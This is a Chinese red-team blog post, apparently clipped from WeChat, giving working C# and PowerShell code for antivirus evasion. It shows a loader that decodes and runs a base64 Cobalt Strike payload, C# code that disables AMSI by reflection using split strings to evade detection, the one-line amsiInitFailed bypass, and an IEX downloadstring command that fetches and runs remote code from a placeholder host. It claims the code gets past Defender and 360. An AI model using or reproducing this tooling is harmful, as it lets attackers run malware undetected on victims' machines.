<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/YWhJ_pFWbfztWeQl2KxKqg)

Powershell 命令免杀的小脚本，可过 Defender、360 等，内容截取老鑫二期：《红队视角的. Net》

**请勿使用于任何非法用途，由此产生的后果自行承担。**  

C# 简介
-----

2001 年发布的面向对象编程语言，作为. Net 框架的 “**主角**”

对于红队意义：后渗透阶段制作程序集直接内存加载运行，无需把文件丢到磁盘上，从而降低被终端安全工具检测到的风险（如 Cobalt Strike 的`execute-assembly`）

C# 和 Powershell
---------------

Powershell 与 .Net Framework 紧密集成，并且可以无缝地与 Windows(包括 Windows Server) 的所有组件一起协作，它们可以互相调用和执行彼此的代码

所以你可以在 powershell 中使用 C#，像下面这样：

```
$MyCode = @"
public class Calc
{
    public int Add(int a,int b)
    {
        return a+b;
    }
    public int Mul(int a,int b)
    {
        return a*b;
    }
    public static float Divide(int a,int b)
    {
        return a/b;
    }
}
"@

```

创建了一个名为 Calc 的类型，它有两个实例方法和一个静态方法，接下来将 Calc 类型添加到当前的 Powershell 会话，使用 New-Object 创建 Calc 类型的实例，然后调用它的方法

![](https://mmbiz.qpic.cn/mmbiz_png/bkcWdoIicx2cVyIdMtCM3WNThOicge7RGIqdbumibaqjWIPqDQAcHb0GTheHj2mrjqb6ibicdTFgib1zRpSkoeibQibKRw/640?wx_fmt=png)

同样我们也可以 Powershell in C#：

所有与 Powershell 相关的功能都位于 System.Management.Automation 命名空间中

```
using System.Management.Automation;
public class Program
{
    public static void Main()
    {
    PowerShell ps1 = PowerShell.Create();
    ps1.AddScript("Start-Process calc.exe");
    ps1.Invoke();
  }
}

```

CS 上线：

![](https://mmbiz.qpic.cn/mmbiz_png/bkcWdoIicx2cVyIdMtCM3WNThOicge7RGIKKBDjgdMhHjPJMQcZFQLah6jNOSmTpTmNGqNME5PzxicKzawcdyRT5w/640?wx_fmt=png)

```
using System;
using System.Text;
using System.Management.Automation;
public class Program
{
    public static void Main()
    {
        PowerShell ps1 = PowerShell.Create();
        String script = "";//payload
        script = System.Text.Encoding.Unicode.GetString(System.Convert.FromBase64String(script));
        ps1.AddScript(script);
        ps1.Invoke();
    }
}

```

免杀：

思路很简单，就是通过 System.Management.Automation.dll 执行底层 api 来绕过杀软对 powershell 的监控

```
using System;
using System.Collections.ObjectModel;
using System.Diagnostics;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Reflection;
using System.Text;
namespace TestExe
{
    class Program
    {
        static void Main(string[] args)
        {
            Runspace Space = RunspaceFactory.CreateRunspace();
            Space.Open();
            Pipeline myPipeLine = Space.CreatePipeline();
      //创建一个管道，禁用AMSI(反恶意软件扫描接口)保护 
            Space.GetType().Assembly.GetType("Syste" + "m.Managem" + "ent.Autom" + "ation.AmsiU" + "tils").GetField("am" + "siInitF" + "ailed", BindingFlags.NonPublic | BindingFlags.Static).SetValue(null, true);
            Console.WriteLine(args[0].Replace("+", " "));
            myPipeLine.Commands.AddScript(args[0].Replace("+"," "));
            Collection<PSObject> outputs = myPipeLine.Invoke();
            Space.Close();
            System.Text.StringBuilder sb = new StringBuilder();
            foreach (PSObject pobject in outputs)
            {
                sb.AppendLine(pobject.ToString());
            }
            Console.WriteLine(sb.ToString());
        }
    }
}

```

patch 绕过 AMSI 的方法会被 360 查杀，因此这里使用了设置 System.Management.Automation.AmsiUtils 的方法来绕过。这种方法是 16 年一个老外发布的，命令如下：

```
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

```

单纯上线只需要：

```
myPipeLine.Commands.AddScript("IEX ((new-object net.webclient).downloadstring('http://ip:port/xxx'))");

```